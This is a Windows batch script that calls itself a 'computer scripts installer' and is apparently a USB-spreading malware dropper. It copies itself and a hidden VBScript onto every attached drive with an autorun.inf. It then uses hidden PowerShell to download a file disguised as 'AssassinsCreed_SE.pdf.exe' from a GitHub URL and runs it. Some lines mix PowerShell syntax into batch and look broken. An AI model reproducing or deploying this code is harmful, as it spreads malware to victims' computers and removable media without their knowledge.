@echo off

@rem Computer scripts installer


@rem Function to check internet connection
:check_internet
echo Checking internet connectivity...
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    echo No internet connection. Retrying...
    timeout /t 7200 >nul
    goto check_internet
)
echo Internet connection established.

@rem check for usb
:check_drive
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (goto Yes)
)

@rem if usb not found, loop back and check again
goto check_drive

@rem if usb present, run payload
:Yes
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        copy "%~f0" "%%d:\AutoRun.bat"
        copy "RunHidden.vbs" "%%d:\RunHidden.vbs"
        echo [autorun] > "%%d:\autorun.inf"
        echo open=RunHidden.vbs >> "%%d:\autorun.inf"
    )
)

@rem timeout /t 5 /nobreak

Check internet connectivity before downloading the payload
call :check_internet

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/raw/de5323fee7f3ea849f8504aed1d3593af243e64d/Venom/AssassinsCreed_SE.pdf.exe -OutFile AssassinsCreed_SE.pdf.exe"

$desktop =  "C:/Users/%USERNAME%/Desktop"
$wd = $PWD

cd $wd

PowerShell -Command "Expand-Archive -Path 'AssassinsCreed_SE.pdf.zip' -DestinationPath 'AssassinsCreed_SE'"


copy $wd/AssassinsCreed_SE/AssassinsCreed_SE.pdf.exe $desktop

start AssassinsCreed_SE.pdf.exe



@rem exit process
:end
exit
